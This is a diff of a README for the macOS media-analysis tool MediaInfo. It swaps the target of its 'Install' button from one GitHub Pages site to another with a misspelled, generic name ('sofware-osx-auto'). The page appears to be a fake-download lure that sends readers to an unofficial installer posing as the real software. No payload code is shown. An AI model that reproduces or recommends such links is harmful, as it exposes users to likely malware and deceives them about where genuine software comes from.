@@ -6,7 +6,7 @@
 <h3>MediaInfo - technical media information tool</h3>
 <p>MediaInfo is a professional multimedia file analysis and metadata viewer application specifically developed for macOS environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://mac-apps-install.github.io/.github/)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sofware-osx-auto.github.io/.github/MI)
 </div>
 <br/><br>
 
